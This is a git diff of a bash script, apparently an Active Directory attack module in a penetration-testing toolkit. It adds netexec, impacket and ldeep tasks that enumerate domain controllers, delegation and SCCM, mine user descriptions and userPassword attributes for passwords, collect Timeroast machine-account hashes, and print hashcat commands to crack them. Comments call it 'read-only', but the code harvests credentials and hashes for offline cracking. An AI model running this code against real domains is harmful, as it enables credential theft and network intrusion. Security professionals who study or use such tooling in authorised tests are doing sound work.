@@ -28,6 +28,15 @@ USERS="$RUN/domain_users.txt"
 [[ -s "$USERS" ]] || USERS="$USER_WORDLIST"
 [[ -s "$OUT/valid_users.txt" ]] && USERS="$OUT/valid_users.txt"
 
+# netexec auth args (LDAP/SMB): use creds if present, else a null/anon session.
+# Mirrors linWinPwn's argument_ne construction, mapped onto cedzo's config vars.
+NE_D=();  [[ -n "$DOMAIN" ]] && NE_D=(-d "$DOMAIN")
+if   [[ -n "$NTHASH"   ]]; then NE_AUTH=(-u "${USERNAME:-}" -H "$NTHASH")
+elif [[ -n "$PASSWORD" ]]; then NE_AUTH=(-u "${USERNAME:-}" -p "$PASSWORD")
+else                            NE_AUTH=(-u '' -p ''); fi   # null session
+HAVE_CREDS=false
+[[ -n "$USERNAME" && ( -n "$PASSWORD" || -n "$NTHASH" ) ]] && HAVE_CREDS=true
+
 # ---- Sub-task: username validation via Kerberos pre-auth ------------------
 # Sends AS-REQ and reads the KDC error to confirm which names exist. This is
 # enumeration only — no passwords are tried, so it cannot lock accounts.
@@ -128,14 +137,107 @@ t_bloodhound() {
   ok "BloodHound zip -> $OUT/bloodhound (import into BloodHound GUI)"
 }
 
-task kerbrute   "Validate usernames via Kerberos pre-auth (kerbrute)" t_kerbrute
-task asrep      "AS-REP roasting (no creds; offline hashes)"          t_asrep
-task kerberoast "Kerberoasting (needs read-only domain creds)"        t_kerberoast
-task adcs       "ADCS template misconfig enum (Certipy)"              t_adcs
-task bloodhound "BloodHound graph collection (-c all)"                t_bloodhound
+# ==========================================================================
+# linWinPwn-derived recon (read-only). The tasks below replicate the READ-ONLY
+# LDAP/SCCM/delegation enumeration from lefayjey's linWinPwn (vendored under
+# vendor/linWinPwn/) — directory queries only. No spraying, brute force, or
+# credential dumping is performed, so cedzo stays recon-only.
+# ==========================================================================
+
+# ---- Sub-task: LDAP recon via netexec (directory queries) -----------------
+t_ldap_recon() {
+  [[ -n "$NXC" ]] || { warn "netexec missing — skipping LDAP recon."; return 0; }
+  local L="$OUT/ldap"; mkdir -p "$L"
+  log "DC list / password-not-required / pass-pol (netexec ldap)"
+  run "$LOG" "$NXC" ldap "$DC1" "${NE_D[@]}" "${NE_AUTH[@]}" --dc-list              || true
+  run "$LOG" "$NXC" ldap "$DC1" "${NE_D[@]}" "${NE_AUTH[@]}" --password-not-required || true
+  run "$LOG" "$NXC" ldap "$DC1" "${NE_D[@]}" "${NE_AUTH[@]}" --pass-pol             || true
+  log "MachineAccountQuota + AD subnets (netexec ldap modules)"
+  run "$LOG" "$NXC" ldap "$DC1" "${NE_D[@]}" "${NE_AUTH[@]}" -M maq                 || true
+  run "$LOG" "$NXC" ldap "$DC1" "${NE_D[@]}" "${NE_AUTH[@]}" -M subnets             || true
+  log "Passwords in user descriptions / userPassword attributes (read-only)"
+  "$NXC" ldap "$DC1" "${NE_D[@]}" "${NE_AUTH[@]}" -M get-desc-users 2>/dev/null > "$L/desc_users.txt" || true
+  grep -iE 'pass|pwd|password|pword' "$L/desc_users.txt" 2>/dev/null | sort -u > "$L/desc_creds.txt" || true
+  [[ -s "$L/desc_creds.txt" ]] && warn "Possible creds in user descriptions -> $L/desc_creds.txt"
+  "$NXC" ldap "$DC1" "${NE_D[@]}" "${NE_AUTH[@]}" -M get-userPassword -M get-unixUserPassword \
+    2>/dev/null > "$L/userpassword_attrs.txt" || true
+  [[ -s "$L/userpassword_attrs.txt" ]] && ok "userPassword attrs -> $L/userpassword_attrs.txt"
+}
+
+# ---- Sub-task: delegation enumeration (attack-path recon) -----------------
+t_delegation() {
+  [[ -n "$NXC" ]] || { warn "netexec missing — skipping delegation enum."; return 0; }
+  log "Delegation enumeration (netexec find-delegation / trusted-for-delegation)"
+  run "$LOG" "$NXC" ldap "$DC1" "${NE_D[@]}" "${NE_AUTH[@]}" --find-delegation        || true
+  run "$LOG" "$NXC" ldap "$DC1" "${NE_D[@]}" "${NE_AUTH[@]}" --trusted-for-delegation  || true
+  # Richer view via impacket findDelegation (needs creds).
+  local FD; FD=$(command -v findDelegation.py || command -v impacket-findDelegation || true)
+  if [[ -n "$FD" && "$HAVE_CREDS" == true ]]; then
+    log "impacket findDelegation"
+    if [[ -n "$NTHASH" ]]; then
+      "$FD" -hashes ":$NTHASH" "$DOMAIN/$USERNAME" -dc-ip "$DC1" > "$OUT/findDelegation.txt" 2>&1 || true
+    else
+      "$FD" "$DOMAIN/$USERNAME:$PASSWORD" -dc-ip "$DC1" > "$OUT/findDelegation.txt" 2>&1 || true
+    fi
+    [[ -s "$OUT/findDelegation.txt" ]] && { cat "$OUT/findDelegation.txt"; ok "findDelegation -> $OUT/findDelegation.txt"; }
+  fi
+}
+
+# ---- Sub-task: SCCM / MECM discovery (read-only) --------------------------
+t_sccm() {
+  [[ -n "$NXC" ]] || { warn "netexec missing — skipping SCCM discovery."; return 0; }
+  log "SCCM / MECM discovery (netexec ldap -M sccm)"
+  echo -n Y | "$NXC" ldap "$DC1" "${NE_D[@]}" "${NE_AUTH[@]}" -M sccm -o REC_RESOLVE=TRUE \
+    2>&1 | tee "$OUT/sccm.txt" || true
+}
+
+# ---- Sub-task: Timeroast (collect computer-account hashes for offline crack)
+# NTP-based; queries the DC and returns RID + MD5 for machine accounts. Like
+# AS-REP/Kerberoast it is COLLECTION for OFFLINE cracking — no spray/lockout.
+t_timeroast() {
+  [[ -n "$NXC" ]] || { warn "netexec missing — skipping timeroast."; return 0; }
+  log "Timeroast (NTP) — collect computer-account hashes for OFFLINE cracking"
+  "$NXC" smb "$DC1" -M timeroast 2>&1 | tee "$OUT/timeroast.txt" || true
+  grep -E '^[0-9]+:\$sntp-ms\$' "$OUT/timeroast.txt" 2>/dev/null | sort -u > "$OUT/timeroast_hashes.txt" || true
+  [[ -s "$OUT/timeroast_hashes.txt" ]] && warn "Timeroast hashes -> $OUT/timeroast_hashes.txt (crack: hashcat -m 31300)"
+}
+
+# ---- Sub-task: full LDAP dump via ldeep (optional, read-only) -------------
+t_ldeep() {
+  have ldeep || { warn "ldeep not installed — skipping full LDAP dump."; return 0; }
+  local d="${DOMAIN:-domain.local}" D="$OUT/ldeep"; mkdir -p "$D"
+  log "Full LDAP dump via ldeep"
+  if [[ "$HAVE_CREDS" == true ]]; then
+    if [[ -n "$NTHASH" ]]; then
+      ldeep ldap -d "$d" -u "$USERNAME" -H "$NTHASH" -s "ldap://$DC1" all "$D/$d" 2>&1 | tee "$D/ldeep_output.txt" || true
+    else
+      ldeep ldap -d "$d" -u "$USERNAME" -p "$PASSWORD" -s "ldap://$DC1" all "$D/$d" 2>&1 | tee "$D/ldeep_output.txt" || true
+    fi
+  else
+    ldeep ldap -d "$d" -a -s "ldap://$DC1" all "$D/$d" 2>&1 | tee "$D/ldeep_output.txt" || true
+  fi
+  # Feed harvested usernames back into the shared list for AS-REP/Kerberoast.
+  if [[ -s "$D/${d}_users_all.lst" ]]; then
+    sort -u "$D/${d}_users_all.lst" "$RUN/domain_users.txt" -o "$RUN/domain_users.txt" 2>/dev/null \
+      || cp "$D/${d}_users_all.lst" "$RUN/domain_users.txt"
+    ok "ldeep harvested users merged into domain_users.txt"
+  fi
+}
+
+task kerbrute   "Validate usernames via Kerberos pre-auth (kerbrute)"  t_kerbrute
+task asrep      "AS-REP roasting (no creds; offline hashes)"           t_asrep
+task kerberoast "Kerberoasting (needs read-only domain creds)"         t_kerberoast
+task adcs       "ADCS template misconfig enum (Certipy)"               t_adcs
+task bloodhound "BloodHound graph collection (-c all)"                 t_bloodhound
+task ldap_recon "LDAP recon: DC-list, MAQ, subnets, desc passwords"    t_ldap_recon
+task delegation "Delegation enum (unconstrained/constrained/RBCD)"     t_delegation
+task sccm       "SCCM / MECM discovery (netexec)"                      t_sccm
+task timeroast  "Timeroast: collect machine-acct hashes (offline)"     t_timeroast
+task ldeep      "Full LDAP dump via ldeep (optional, read-only)"       t_ldeep
 run_tasks
 
 log "Crack any collected roast hashes OFFLINE (out of band):"
 log "  hashcat -m 13100 $OUT/kerberoast_hashes.txt rockyou.txt   # Kerberoast"
 log "  hashcat -m 18200 $OUT/asrep_hashes.txt      rockyou.txt   # AS-REP"
+log "  hashcat -m 31300 $OUT/timeroast_hashes.txt  rockyou.txt   # Timeroast"
 ok "AD recon module complete -> $OUT"
